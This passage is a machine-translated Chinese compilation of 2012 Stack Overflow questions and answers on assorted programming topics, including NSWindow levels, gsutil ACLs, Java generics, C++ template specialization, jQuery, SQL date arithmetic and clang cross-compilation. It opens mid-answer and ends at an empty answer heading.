我一直遵循这个 [http://www.iis.net/learn/extensions/url-rewrite-module/using-custom-rewrite-providers-with-url-rewrite-module](http://www.iis.net/learn/extensions/url-rewrite-module/using-custom-rewrite-providers-with-url-rewrite-module)

看看对你有没有帮助。

# objective-c - NSWindow 在每个应用程序的前面和菜单栏的前面 Objective-c Mac

> ID：13221639
> 
> 赞同：4
> 
> 时间：2012-11-04T18:43:35.787
> 
> 标签：objective-c, macos, window, nswindow, menubar

如何让我的 NSWindow 出现在每个应用程序和菜单栏的前面？我也不想在我的窗口上有一个标题栏。只是一个没有停靠菜单栏的全屏应用程序，而不是苹果的全屏模式。我可以让我的窗口高于所有其他应用程序并像这样停靠：

```
[window setLevel:kCGPopUpMenuWindowLevel]; 
```

但它不包括mac菜单栏。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-04T18:49:04.057

You can't move a default window higher that the menu bar, because it's constrained. You have to subclass NSWindow and override `constrainFrameRect:toScreen:`

```
- (NSRect)constrainFrameRect:(NSRect)frameRect toScreen:(NSScreen *)screen {
    return frameRect;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-03T00:31:36.710

将窗口级别设置为`NSMainMenuWindowLevel + 2`。

如果使用`NSMainMenuWindowLevel + 1`顶部菜单栏，有时仍会出现但非常不可预测。`NSMainMenuWindowLevel + 2`强制它停留在菜单栏上方并永久保持焦点。

```
[window setLevel:NSMainMenuWindowLevel + 2]; 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2016-10-11T15:11:02.067

在斯威夫特 3 中：

```
window.level = Int(CGWindowLevelForKey(.mainMenuWindow)) + 2 
```

# google-cloud-storage - 从 PC 应用程序使用谷歌云存储

> ID：13221640
> 
> 赞同：1
> 
> 时间：2012-11-04T18:43:38.707
> 
> 标签：google-cloud-storage

希望我问这个听起来不会太愚蠢。我和妻子在家里经营一家小企业。我们想共享会计数据，但我经常在另一个地方。我们使用具有网络功能的 PC 版 Sage Peachtree Premium Accounting，因此数据文件可以存储在一个公共位置。是否可以使用 Google Cloud Storage 之类的工具共享此文件？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T19:28:40.467

Google Drive 无疑是更便宜的选择，因为它针对消费者的使用模式进行了优化。Google Cloud Storage 针对需要高度可用且具有强大全球一致性的复制存储的应用程序进行了优化。

以下是 Google Cloud Storage 尝试改进团队协作的几种方式：

1.  资源由多人组成的项目团队拥有。
2.  可以与组共享文件。
3.  可以更改应用于新对象的默认 acl。

### 与团队合作

每个存储桶都归一个项目所有，默认情况下，您团队中的每个人都可以读取上传到这些存储桶的新对象。

您可以通过以下方式管理团队中的人员：

*   转到[https://code.google.com/apis/console](https://code.google.com/apis/console)
*   单击侧边栏上的团队。
*   添加您想与之协作的其他人的电子邮件地址。
*   使用下拉列表为他们提供更多权限。
*   使用 x 删除团队成员。

权限是同心的：

*   具有`can view`访问权限的每个人都可以读取未指定 acl 的文件。
*   每个拥有`can edit`访问权限的人都可以创建和删除存储桶以及上传新对象。
*   拥有访问权限的每个人都`is owner`可以添加其他查看者、编辑者和所有者。

### 分享到 Google 群组

Google Cloud Storage 允许您与 Google 群组共享文件。当您将这些文件添加到组时，用户可以访问这些文件，而当您从组中删除它们时，用户将失去访问权限。

首先下载对象acl：

```
gsutil getacl gs://bucket/obj > acl.xml
vim acl.xml 
```

`<Entries/>`现在在标签内添加以下 acl 条目：

```
 <Entry>
    <Scope type="GroupByEmail">
      <!-- Give everyone in the gs-discussion group READ access. -->
      <EmailAddress>gs-discussion@googlegroups.com</EmailAddress>
    </Scope>
    <Permission>READ</Permission>
  </Entry> 
```

现在更新acl：

```
gsutil setacl acl.xml gs://bucket/obj 
```

有关访问控制的更多信息，请参阅在线文档[https://developers.google.com/storage/docs/accesscontrol#applyacls](https://developers.google.com/storage/docs/accesscontrol#applyacls)

您可以在 google.com/groups 创建一个 Google 群组

### 更改默认对象 acl

默认情况下，团队中的每个人都可以阅读您上传的对象。但是，您可以将其配置为或多或少允许。您可以将对象设为默认公开可读，或仅由所有者和 Google 群组查看。

更改默认对象 acl 类似于更改对象 acl。只需使用`getdefacl`and`setdefacl`命令。

一些预定义的配置不需要编辑 xml 文件：

```
# Team members can view new objects.
gsutil setdefacl project-private gs://bucket
# Anonymous internet users can view new objects.
gsutil setdefacl public-read gs://bucket 
```

否则，您可以编辑 acl xml：

```
gsutil getdefacl gs://bucket > def_acl.xml
vim def_acl.xml
# Add whichever UserByEmail, GroupByEmail, AllUsers, etc grants you want.
gsutil setdefacl def_acl.xml gs://bucket 
```

新对象应用默认对象 acl：

```
gsutil cp foo gs://bucket  # This object will receive the def_acl.xml acls. 
```

使用特定对象的预定义 acl 覆盖默认对象 acl 很容易：

```
# Ignore the default acl. Use public-read.
gsutil cp -a public-read foo gs://bucket 
```

developer.google.com/storage/docs/accesscontrol#extension 上提供了预定义 acl 的完整列表

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T18:52:05.327

Google Cloud Storage is probably overkill for what you're talking about. Cloud Storage is something web developers use to deliver assets like images, videos, and documents to a large number of users around the world.

However something like Google Drive or Dropbox would probably work well for this. If you both have Gmail accounts then Google Drive is a natural choice. Both of these solutions have a service which runs on each PC and automatically syncs changed files in a specified folder to all other computers using that folder.

So if one of you makes changes to the file, it will show up in the other location automatically. However the real question is how your software will handle this. I'm not familiar with Peachtree Accounting but it probably isn't possible for you to both be making changes at the same time, unless the software is specifically designed for that use case.

If you can post a link or description for the "networking capabilities" (that is a rather vague term on its own) it may be possible to tell for sure.

# ruby-on-rails - Twitter Bootstrap + SimpleForm：将图标附加到表单字段不会显示错误消息

> ID：13221641
> 
> 赞同：2
> 
> 时间：2012-11-04T18:43:45.040
> 
> 标签：ruby-on-rails, twitter-bootstrap, validation, simple-form

我想使用 Twitter Bootstrap 将图标附加到 SimpleForm 表单字段。这是我在另一个 SO 问题中找到的解决方案：

```
<div class="input-append date" id="birthday-picker" data-date="06-04-1986" data-date-format="dd-mm-yyyy">
    <%= f.input :birthday, :wrapper => :append do %>
        <%= f.input_field :birthday, as: :string, placeholder: "06-04-1986", readonly: true %>
        <span class="add-on"><i class="icon-th"></i></span>
    <% end %>
</div> 
```

但是，当我将这段代码添加到我的表单时，验证会启动，但不会显示该特定字段的消息。请对发生的事情有任何想法吗？

## 更新

这是生成的 HTML：

```
<div class="input-append date" id="birthday-picker" data-date="06-04-1986" data-date-format="dd-mm-yyyy">
    <div class="control-group date required error">
        <label class="date required control-label" for="user_birthday">Birthday <abbr title="required">*</abbr></label>
        <div class="controls"><div class="input-append">
            <input class="string required readonly" id="user_birthday" name="user[birthday]" readonly="readonly" size="50" type="text" value="31-03-2012">
            <span class="add-on"><i class="icon-th"></i></span>
        </div>
        <span class="help-inline">You are too young</span>
    </div>
</div> 
```

如您所见，生成了错误消息。但由于某种原因，包含错误消息的范围会应用以下样式：

```
.input-append, .input-prepend {
  font-size: 0;
  white-space: nowrap;
} 
```

即使它在`input-append`div 之外......任何想法发生了什么？

## 更新 2

错误消息实际上是在`input-append`我删除的 div 中。现在出现错误消息，但它在输入下方，而不是像常规输入那样内联......

# mapping - 使用 VEMap 为区域着色

> ID：13221646
> 
> 赞同：0
> 
> 时间：2012-11-04T18:44:06.813
> 
> 标签：mapping, bing-maps, virtual-earth, vwdexpress

使用visual web developer express 2010，我想显示一个形状文件，并能够根据一些数据值操纵该形状文件指定的区域的颜色。

我发现了一些代码（我认为它是一个 MSDN 页面），它在网页的屏幕上显示了一个简单的地图。这里是：

```
 <script type="text/javascript" src="http://ecn.dev.virtualearth.net/mapcontrol/mapcontrol.ashx?v=6.3"></script>

  <script type="text/javascript">
      var map;

      function OnPageLoad() {
          map = new VEMap('myMap');
          map.LoadMap();

      }
  </script>

<body onload="OnPageLoad();">
  <div id="myMap" style="position:relative;width:640px;height:480px;"></div> 
```

它本身不使用 shapefile，而是它指向的在线文件（虚拟地球）。没关系，这可能有效，但是...

它显示带有一些基本控制机制（平移、缩放等）的地图。我将其复制粘贴到网页中，效果很好。我希望能够根据某些值在此地图上为区域着色。我认为这个东西（一个对象模型）必须有某种底层结构，其中包含对区域的引用等。但我可以从可视化 Web 开发人员快递 2010 中的智能感知获得任何帮助。

任何人都知道如何做到这一点？

同时，回到搜索网络。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-06T16:04:57.283

在 6.3 中，我相信您使用[VEShape 类](http://msdn.microsoft.com/en-us/library/bb412535.aspx)来做到这一点。

以下是6.3[支持的类。](http://msdn.microsoft.com/en-us/library/bb429565.aspx)

这些是一些很好的[例子](http://www.garzilla.net/vemaps/Draggable-Polygon-with-Bing-Maps-7.aspx)，可以帮助您入门。虽然其中很多是 7.0 版，但语法非常相似。如果您在转换时遇到问题，这里是msdn 提供的从 6.3 到 7.0的不错[迁移。](http://msdn.microsoft.com/en-us/library/hh237870.aspx)

# java - java中的instanceof在嵌套数组列表上

> ID：13221652
> 
> 赞同：0
> 
> 时间：2012-11-04T18:44:48.797
> 
> 标签：java, string, arraylist, instanceof

为什么我在 if 语句中出现错误，我该怎么做才能找到嵌套数组列表可以容纳的数据类型？

```
ArrayList<List<? extends Object>> table;
table = new ArrayList<List<? extends Object>>();
table.add(new ArrayList<String>());
if( table.get(0) instanceof List<String> ){
//Do something
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T19:20:15.063

作为替代方案，您可以为 String 和 Integer 创建 ArrayList 的两个子类，并检查它们：

```
public class StringList extends ArrayList<String> {
   //Add needed constructors here
}

public class IntegerList extends ArrayList<Integer> {
   //Add needed constructors here
} 
```

然后，您可以执行以下操作：

```
ArrayList<List<? extends Object>> table;
table = new ArrayList<List<? extends Object>>();
table.add(new StringList());
if( table.get(0) instanceof StringList ){
//Do something
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T18:47:10.777

您不能`instanceof`与泛型类型一起使用。泛型类型在运行时被擦除。

# php - 在用户模式下编辑页面模板的某些部分

> ID：13221656
> 
> 赞同：1
> 
> 时间：2012-11-04T18:45:30.417
> 
> 标签：php, html, wordpress

我有一个在 WP 中工作的网页，需要一些自定义。首先，我创建了一个页面模板，可以反复使用，只更改部分内容。我想知道通过 HTML 编辑器中的管理面板启用此事实时可用的选项（如果可能）...

希望我的问题对大家来说足够清楚。

让我添加一些代码来展示我想要完成的工作。

```
 <div id="header-style">
 <?php get_header();?>
 </div>

 <div id="content">

<div id="about">
 //This is what i want to be able to edit

 </div>

<div id="features">
//This is what i want to be able to edit

</div>

</div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T21:27:06.800

迪诺：

有很多方法可以做到这一点。我要问您的主要问题是，谁将添加/编辑此内容？如果您要让一群人添加内容，则需要对输入进行剥离和清理（以避免注入标签或其他有害内容）。如果它只是你，那么这里是最简单/最快的解决方案：

使用**自定义字段**。如果您在帖子/页面编辑屏幕中看不到它们，请转到帖子编辑屏幕右上角的小标签，上面写着“屏幕选项”（或类似的东西），然后单击“自定义字段”。

看到自定义字段编辑框后，您可以添加任意数量的字段。这些存储为发布元数据。您可以`<?php the_meta(); ?>`在循环中使用该函数来显示所有自定义字段。

[您可以使用get_post_meta()](http://codex.wordpress.org/Function_Reference/get_post_meta)访问特定字段。您传入 postID 和元字段的键：

`<?php echo get_post_meta(get_the_ID(), 'my_key'); ?>`

因此，对于您的示例，您将在后期编辑屏幕中添加：

`about: Some text to go in the about section.`

`features: Some text to go in the features section.`

然后，您将在您的页面上访问这些，如下所示：

```
<div id="header-style">
 <?php get_header();?>
 </div>

 <div id="content">

<div id="about">
    <?php echo get_post_meta(get_the_ID(), 'about'); ?>
</div>

<div id="features">
    <?php echo get_post_meta(get_the_ID(), 'features'); ?>
</div>

</div> 
```

# scala - 在 Scala 中解码 Bouncy Castle ASN.1 对象

> ID：13221658
> 
> 赞同：0
> 
> 时间：2012-11-04T18:45:50.493
> 
> 标签：scala, decode, bouncycastle

嗨，我正在使用 Scala 和 Bouncy Castle Crypto 库从文件中读取 X.509 证书。我正在尝试使用以下代码读取某些扩展的值：

```
val ext = JcaX509ExtensionUtils.parseExtensionValue(certificate.getExtensionValue("2.5.29.17")) 
```

这将返回一个 ASN.1 对象，如下所示。

```
class org.bouncycastle.asn1.DLSequence 
```

我现在需要解码 ASN.1 对象以获取值。但是，我似乎在绕圈子，因为我不知道如何在不涉足大量 Java 代码的情况下轻松解码 ASN.1 对象。肯定不会那么难吧？

这是我拥有并且目前正在工作的代码：

```
import java.io._
 import java.security.cert.CertificateFactory
 import java.security.Security
 import org.bouncycastle.jce.provider._
 import org.bouncycastle.cert.jcajce.JcaX509ExtensionUtils

 object Main extends App {     
 Security.addProvider(new BouncyCastleProvider)
 val provider = new BouncyCastleProvider
 val in = new FileInputStream("cert.cer")
 var certificateFactory = CertificateFactory.getInstance("X509", provider)
 val certificate = certificateFactory.generateCertificate(in).asInstanceOf[X509CertificateObject]

 val ext = JcaX509ExtensionUtils.parseExtensionValue(certificate.getExtensionValue("2.5.29.17"))

 println(ext)

} 
```

输出：

```
[[2]#4c303037313035392e6d6e73756b2e6164726f6f742e6d61726b73616e647370656e6365722e636f6d] 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T08:03:12.003

如果您只对扩展 2.5.29.17（主题替代名称）感兴趣，为什么不使用证书。[getSubjectAlternativeNames](http://docs.oracle.com/javase/7/docs/api/java/security/cert/X509Certificate.html#getSubjectAlternativeNames%28%29) ()? 这为您提供了对该特定扩展的良好面向对象的访问......当然，其他扩展也有辅助函数。

# ruby - Savon 似乎只读取多端口肥皂服务的第一个端口

> ID：13221661
> 
> 赞同：1
> 
> 时间：2012-11-04T18:46:09.487
> 
> 标签：ruby, xml, savon

我将 Savon 与以下 WSDL 一起使用

```
<wsdl:definitions xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" xmlns:v2bind="urn:oasis:names:tc:wsrp:v2:bind" xmlns="http://schemas.xmlsoap.org/wsdl/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" targetNamespace="urn:oasis:names:tc:wsrp:v2:wsdl">
<import namespace="urn:oasis:names:tc:wsrp:v2:bind" location="http://localhost:8080/wsrp-portlet/wsdl/wsrp-2.0-bindings.wsdl"/>
<wsdl:service name="WSRP_v2_Service">
    <wsdl:port binding="v2bind:WSRP_v2_Markup_Binding_SOAP" name="WSRP_v2_Markup_Service">
        <soap:address location="http://localhost:8080/wsrp-portlet/services/WSRP_v2_Markup_Service?wsrpProducerUuid=48322cfd-c68b-4053-b9b4-aff1644d6e1e"/>
    </wsdl:port>
    <wsdl:port binding="v2bind:WSRP_v2_ServiceDescription_Binding_SOAP" name="WSRP_v2_ServiceDescription_Service">
        <soap:address location="http://localhost:8080/wsrp-portlet/services/WSRP_v2_ServiceDescription_Service?wsrpProducerUuid=48322cfd-c68b-4053-b9b4-aff1644d6e1e"/>
    </wsdl:port>
    <wsdl:port binding="v2bind:WSRP_v2_Registration_Binding_SOAP" name="WSRP_v2_Registration_Service">
        <soap:address location="http://localhost:8080/wsrp-portlet/services/WSRP_v2_Registration_Service?wsrpProducerUuid=48322cfd-c68b-4053-b9b4-aff1644d6e1e"/>
    </wsdl:port>
    <wsdl:port binding="v2bind:WSRP_v2_PortletManagement_Binding_SOAP" name="WSRP_v2_PortletManagement_Service">
        <soap:address location="http://localhost:8080/wsrp-portlet/services/WSRP_v2_PortletManagement_Service?wsrpProducerUuid=48322cfd-c68b-4053-b9b4-aff1644d6e1e"/>
    </wsdl:port>
</wsdl:service> 
```

当我检查时，

```
savon.wsdl.endpoint 
```

我只得到，

```
#<URI::HTTP:0x00000101eea398 URL:http://localhost:8080/wsrp-portlet/services/WSRP_v2_Markup_Service?wsrpProducerUuid=48322cfd-c68b-4053-b9b4-aff1644d6e1e> 
```

savon 可以处理具有多个端口定义的 wsdl 吗？如果没有关于支持它的红宝石替代品的任何建议？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T21:41:35.167

我在 Savon 上也看到了同样的情况。我可以通过显式设置端点来手动更改端点

```
Savon.client do
  wsdl.endpoint = "http://service.example.com"
end 
```

# java - 如何将两个 JSON 格式的 Java 字符串加在一起？

> ID：13221663
> 
> 赞同：1
> 
> 时间：2012-11-04T18:46:30.883
> 
> 标签：java, json

我有两个 JSON 格式字符串

```
 {"user1":{"Iden":4,"nID":1},"user2":{"Iden":5,"nID":1}} // String A JSON 

 {"user1":{"Iden":4,"nID":1},"user3":{"Iden":6,"nID":1},"user2":{"Iden":5,"nID":1}} 
```

在下面的程序中，这些上面的 JSON 由 Eclipse IDE 格式化

这是我的程序：

```
import java.util.Map;

import org.codehaus.jackson.type.TypeReference;

import com.tradeking.at.util.JsonHelper;

public class Hi {
    private static JsonHelper jsonHelper = JsonHelper.getInstance();

    public static void main(String[] args) throws Exception {

        Map<String, Tracker> totalCusts = null;

        String A = "{\"user1\":{\"Iden\":4,\"nID\":1},\"user2\":{\"Iden\":5,\"nID\":1}}";
        String B = "{\"user1\":{\"Iden\":4,\"nID\":1},\"user3\":{\"Iden\":6,\"nID\":1},\"user2\":{\"Iden\":5,\"nID\":1}}";

        String totalString =  A+B;

        if (null != totalString) {
            totalCusts = (Map<String, Tracker>) jsonHelper.toObject(
                    totalString, new TypeReference<Map<String, Tracker>>() {
                    });

        }

        System.out.println(totalCusts);

    }

} 
```

跟踪器.java：

```
import org.json.JSONObject;

public class Tracker extends JSONObject{

} 
```

当我运行上述内容时，输出为

```
{user1={}, user2={}} 
```

如果我使用这个：

```
String totalString =  B + A ; 
```

O/p 为：

```
{user1={}, user3={}, user2={}} 
```

请让我知道如何添加两个 JSON 字符串？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-04T19:00:13.890

在顶层，JSON 文档始终是单个**对象**、**数组**或**值**。通过将两个字符串连接在一起，您违反了这个原则。一个简单的解决方法是将两个值连接到一个数组中：

```
String totalString =  "[" + A + ", " + B + "]"; 
```

然后像这样解析。或者您可以简单地一次解析每个 JSON 文档，然后附加或合并您的结果（我怀疑您想通过 合并它们`Map.putAll`）。

鉴于您的`userN`键的值是空的，您的`JsonHelper`类中可能有一个错误，但是如果没有看到代码就很难说。

# iphone - TableView 数据覆盖导航栏

> ID：13221669
> 
> 赞同：0
> 
> 时间：2012-11-04T18:46:46.203
> 
> 标签：iphone, uitableview, uinavigationcontroller

我在我的应用程序中使用 StoryBoard，并且在导航控制器中嵌入了一个 tableviewcontroller。

![在此处输入图像描述](../Images/9ce46e5ffb23edb73638521bcf755292.png)

当我没有将数据加载到表格视图中时，导航栏会正确显示，但是当我将数据加载到表格视图中时，导航栏会消失并且表格视图会扩展全屏。发生这种情况有什么原因吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T19:07:59.333

如果您定义高度标题部分有帮助吗？：

```
-(CGFloat)tableView:(UITableView *)tableView heightForHeaderInSection:(NSInteger)section{
    return 44.0;
} 
```

# c++ - 一系列相关函数的通用函数（例如 std::stoi、std::stof、std::stod 等）

> ID：13221673
> 
> 赞同：6
> 
> 时间：2012-11-04T18:47:11.057
> 
> 标签：c++, templates

我想为 std::stoi、std::stof、std::stod 等创建一个通用函数。比如：

```
// std::string -> int
std::string str = "1000000";
int i = to_numeric<int>(str);

// std::string -> long
std::string str = "100000000000";
long i = to_numeric<long>(str);

// std::string -> float
std::string str = "10000.1";
float i = to_numeric<float>(str); 
```

但我不知道如何进行部分专业化：

```
template<class T>
int to_numeric(const std::string &str, size_t *pos = 0, int base = 10) {
    return std::stol(str, pos, base);
};

template<>
long to_numeric<long>(const std::string &str, size_t *pos, base) {
    return std::stol(str, pos, base);
};

template<>
float to_numeric<float>(const std::string &str, size_t *pos) {
    return std::stof(str, pos);
};
// ..... 
```

**错误：**

```
to_numeric.cpp:76:79: error: default argument specified in explicit specialization [-fpermissive]
to_numeric.cpp:76:12: error: template-id 'to_numeric<float>' for 'float to_numeric(const string&, size_t*)' does not match any template declaration
make: *** [build] Error 1 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T18:56:37.903

您指定了一个带有三个参数（ 、 和 ）的主模板，`str`但`pos`您`base`尝试使用只带一个参数的函数模板来专门化它。显然，这是行不通的：专业化需要匹配主模板。

[还没有？] 支持函数模板的部分特化。如果您需要一个部分特化的函数模板，您需要间接地进行部分特化：您将委托给一个类模板并对其进行部分特化。类模板可能只有一个`static`功能。当然，在您的示例中，您不使用部分专业化而是完全专业化。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T18:57:04.687

首先，您必须使非专用模板函数*完全*模板化。这意味着您必须设置返回类型`T`。我还建议这个非特化函数除了 return eg 之外什么都不做`T()`（因为它不是特化的并且不知道要调用什么函数）。

要继续，特化`to_numeric<float>`需要与非特化函数具有*相同*的参数，因此您需要添加虚拟`base`参数。

# c# - 有属性的节点列表

> ID：13221676
> 
> 赞同：3
> 
> 时间：2012-11-04T18:47:57.383
> 
> 标签：c#, .net, linq-to-xml

我需要具有等于**Vehicle的属性****SecondFeature (Descendants-ObjectClass) 的 Descendants(Frame) 的所有属性****ID**（值）的列表。（有一个节点有 1 个“对象”，其他 2/3 时间和其他根本没有）这是代码的一部分：

 ****```
<?xml version="1.0" encoding="utf-8" ?> 
- <Frame ID="120">
<PTZData Zoom="1.000" />
- <Object ID="5">
 <ObjectClass SecondFeature="vehicle" /> 
</Object>
</Frame> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T19:16:56.897

您可以使用以下[XPath 表达式](http://msdn.microsoft.com/en-us/library/bb342176.aspx)来做到这一点：

```
var xml = // your XML string here
var doc = XDocument.Parse(xml);
var frameIds = doc.Root.XPathSelectElements(
        "//Frame[./Object/ObjectClass[@SecondFeature ='Vehicle']]")
    .Select(n => n.Attribute("ID").Value); 
```

自然，如果您的`Frame`节点可以在没有`ID`属性的情况下出现，您将需要在`.Select`.

或者，非xpath方法（但恕我直言，这不太可读，需要更加谨慎）：

```
var frameIds = doc
    .Descendants("ObjectClass")
    .Where(n => n.Attribute("SecondFeature").Value == "Vehicle")
    .Select(n => n.Parent.Parent.Attribute("ID").Value); 
```****

# javascript - 在 jquery click 上循环遍历

> ID：13221677
> 
> 赞同：1
> 
> 时间：2012-11-04T18:48:00.403
> 
> 标签：javascript, jquery, css, html

```
<div id="facts">
<p>notes:</p><span class="hide">note 1</span>
             <span class="hide">note 2</span>
             <span class="hide">note 3</span>
             <span class="hide">note 4</span>
</div> 
```

我正在尝试制作一个简单的“幻灯片”循环循环，一次只显示“事实：”右侧的一个跨度，但我似乎无法弄清楚如何让它正常工作。

```
.hide {
    display: none;
}

.show {
    display: inline;
} 
```

我在想你可以使用 jquery 添加/删除类吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T18:52:10.200

Using jQuery `.hide()`, you can first hide all of them. Then increment a variable on click, and compare its value to `% 4` where 4 is the total number of available spans. Unhide the `:eq()` for the variable's current value.

```
$(document).ready(function() {
    var current = 0;

    // This is bound to the onclick, but you can attach it to any event.
    $('#facts').click(function() {
      // Hide all of them
      $('#facts span').hide();
      // Unhide the current one:
      $('#facts span:eq(' + (current % 4) + ')').show();
      // Increment the variable;
      current++;
    });
}); 
```

​ [Here is a live demo](http://jsfiddle.net/tnJ7e/4/)

Note that if the number of child `<span>` varies, you would want to use `$('#facts span').length` as the modulo `%` comparison rather than the hard-coded 4 as in:

```
$('#facts span:eq(' + (current % $('#facts span').length) + ')').show(); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T18:53:43.333

You can use `setInterval` function:

```
var $spans = $('span'), i = 0;
setInterval(function(){
     if (i == $spans.length) i = 0;
     $spans.hide().eq(i).show()
     i++   
}, 2000) 
```

[http://jsfiddle.net/Chyuw/](http://jsfiddle.net/Chyuw/)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T18:55:10.850

我要做的是有一个带有基本计数变量的函数，以及一个用于重置变量的 if 语句。您可以使用`:eq()`选择器来选择像数组这样的元素。

```
i = 0;
$('element').click(function() {
  $('span').hide();
  $('span:eq(i)').show(); // shows only the one indexed span tag
  i++;
  if (i > [amount of span tags]) { // resets i if it gets too big
    i = 0; 
  }
} 
```

所以基本上你只是在不断地迭代。

# ios - 创建存折通行证时出错

> ID：13221688
> 
> 赞同：1
> 
> 时间：2012-11-04T18:49:06.423
> 
> 标签：ios, cocoa-touch, runtime-error, passbook, passslot

我正在制作一个使用 Passbook / PassKit 的 iOS 应用程序。我拥有所有证书、配置和 ID。但是，在我的应用程序的最新版本中，我在尝试向 Passbook 添加通行证时遇到了这两个错误：

```
Invalid data error reading card pass.PASSTYPE.ID/PASSTYPE-ID. Pass dictionary must contain key 'key'. 
```

和：

```
Creation of pass failed: Error Domain=PKPassKitErrorDomain Code=1 "The pass cannot be read because it isn't valid." UserInfo=0x1c5de340 {NSUnderlyingError=0x1d5dca50 "Pass dictionary must contain key 'key'.", NSLocalizedDescription=The pass cannot be read because it isn't valid.} 
```

这似乎很随机（再次感谢 Xcode 4），但我确信这是我正在做的事情。

我通过连接到服务器（[www.PassSlot.com](http://www.passslot.com)）然后对其进行编辑和下载来创建通行证。这可能与我的互联网连接（例如 HTTP 与 HTTPS 或速度）有关吗？或者它是否与完全不同的东西有关，例如无效的权利文件或类似的东西？

我在 Xcode 中看到了很多错误，但是这个 PassKit 错误对我来说很神秘。任何帮助，将不胜感激！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T21:55:37.037

经过大量繁琐的努力，我发现当`pass.json`文件具有以下部分时会出现这些错误：

```
eventTicket {
    primaryField {
       key : key
       label : label
       value : value
    }
} 
```

但是缺少`key`错误中所说的。唯一对错误感到困惑的部分是所谓`passDictionary`的 ，我从未听说过`pass.json`文件被称为。

作为将来的说明，所有**字段**`key`都可以具有相同的值。

# sql - 我可以计算 SQL Server 中两个日期之间的周末天数吗？

> ID：13221690
> 
> 赞同：7
> 
> 时间：2012-11-04T18:49:17.420
> 
> 标签：sql, sql-server-2008, datetime

我正在为一份报告计算租用设备的收入。与平时相比，周末的招聘成本将增加 10%。那么我如何计算两个日期之间有多少个周末。在报表查询中，我也不能使用 DECLARE。有人可以帮我做到这一点。非常感谢

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-11-04T18:56:20.153

这应该有效：

```
DECLARE @StartDate DATETIME
DECLARE @EndDate DATETIME
SET @StartDate = '2012/11/01'
SET @EndDate = '2012/11/05'

SELECT
  (DATEDIFF(wk, @StartDate, @EndDate) * 2)
   +(CASE WHEN DATENAME(dw, @StartDate) = 'Sunday'   THEN 1 ELSE 0 END)
   +(CASE WHEN DATENAME(dw, @EndDate)   = 'Saturday' THEN 1 ELSE 0 END) 
```

[http://sqlfiddle.com/#!3/d41d8/5707/0](http://sqlfiddle.com/#!3/d41d8/5707/0)

# php - Does anyone know how I can get rid of hex A0 from a string?

> ID：13221691
> 
> 赞同：5
> 
> 时间：2012-11-04T18:49:26.687
> 
> 标签：php, javascript, hex

I have the following string:

> Hello.   Hello.

If you look at the string in a hex editor it looks like this:

> 48 65 6C 6C 6F 2E 20 A0 20 20 48 65 6C 6C 6F 2E

Note the `A0` in the middle. (This is the no-break space character).

`A0` is breaking some JavaScript I am using so I would like to remove it when the string is being pre-processed by a PHP script.

If I use the following code:

```
$text = preg_replace("/\xA0/"," ", $text); 
```

the `A0` gets replaced with `00` which is also a troublesome character.
As you can see from the `preg_replace` function, it should be replace by a space, or `20`.

Do any of you know how I can get rid of this troublesome `A0` character?

Thank you.

EDIT: I am using Windows-1252 and cannot switch to UTF-8\. This won't be a problem if you are using UTF-8...

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T18:57:34.033

简单的

```
$string = str_replace(chr(160), " ", $string); 
```

简单测试

```
$string = "48656C6C6F2E20A0202048656C6C6F2E" ;
                        ^----------------------- 0A

//Rebuild String
$string = pack("H*",$string);

//Replace 0A Charater 
$string = str_replace(chr(160), " ", $string);

//Send Output 
var_dump($string,bin2hex($string)); 
```

输出

```
string 'Hello.    Hello.' (length=16)
string '48656c6c6f2e2020202048656c6c6f2e' (length=32) 
                     ^---------------------- 0A Replaced with 02 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T19:08:15.507

我想出了一个解决方案：

首先转换编码类型，然后进行替换：

```
$text = mb_convert_encoding($text, "Windows-1252", "UTF-8");
$text = preg_replace("/\xA0/"," ", $text); 
```

# c++ - Clang is not compiling code for platforms other than x86

> ID：13221693
> 
> 赞同：10
> 
> 时间：2012-11-04T18:49:47.047
> 
> 标签：c++, arm, llvm, clang

I'm under Ubuntu 12.04 x86 64 bit, I have compiled a 32 bit version of `llvm/clang` from the official svn repository successfully.

I'm now trying to compile c++ code for ARM, at this point i don't care about platform versions like `armv5` vs `armv7a`, I'm focusing on how the platform switch works for `clang`:

```
llvm-config --targets-built
ARM CellSPU CppBackend Hexagon Mips MBlaze MSP430 NVPTX PowerPC Sparc X86 XCore 
```

but the following command doesn't work

```
clang++ -arch arm soft.cpp -o soft_ARM 
```

the output is

```
clang-3: warning: argument unused during compilation: '-arch arm' 
```

I have also tried gcc-like variants or other combinations like `-arch=arm`, `-arch=armv7a`, `-march=armv5` but nothing seems to work.

After reading some docs i noticed that clang works for ARM only under MAC OS X / Darwin and it's not supposed to work for ARM under other OS.

How i can compile for ARM with clang and what the output of `llvm-config --targets-built` is really about ?

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-05T02:08:39.193

